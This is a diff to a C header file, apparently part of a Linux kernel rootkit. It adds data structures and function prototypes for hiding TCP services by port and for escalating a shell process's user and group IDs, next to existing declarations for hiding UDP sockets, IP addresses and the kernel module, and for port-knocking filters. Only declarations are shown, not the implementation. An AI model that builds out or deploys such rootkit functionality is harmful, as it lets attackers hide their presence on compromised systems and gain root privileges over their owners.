@@ -35,6 +35,12 @@ struct udp_socket {
 	int port;
 };
 
+/* list for hidden tcp services (by port) */
+struct hidden_service {
+	struct list_head list;
+	int port;
+};
+
 /* list for hidden ip addresses */
 struct hidden_ip {
 	struct list_head list;
@@ -54,6 +60,20 @@ struct port_knocking {
 	int port;		/* the port that is filtered */
 	int protocol;	/* tcp or udp */
 	int ipaddr;		/* the ip that is allowed to connect */
+};
+
+/* list for id's of the escalated shell*/
+struct escalated_pid {
+	struct list_head list;
+	pid_t pid;
+	int uid;
+	int euid;
+	int suid;
+	int fsuid;
+	int gid;
+	int egid;
+	int sgid;
+	int fsgid;
 };
 
 /*
@@ -109,6 +129,15 @@ int
 unhide_udp_socket(int port);
 
 int
+is_service_hidden(int port);
+
+int
+hide_service(int port);
+
+int
+unhide_service(int port);
+
+int
 is_ip_hidden(__u32 ipaddr);
 
 int
@@ -125,6 +154,15 @@ hide_module(char *name);
 
 int
 unhide_module(char *name);
+
+struct escalated_pid *
+is_shell_escalated(pid_t pid);
+
+int
+escalate(struct escalated_pid *);
+
+int
+deescalate(pid_t pid);
 
 void
 initialize_control(void);
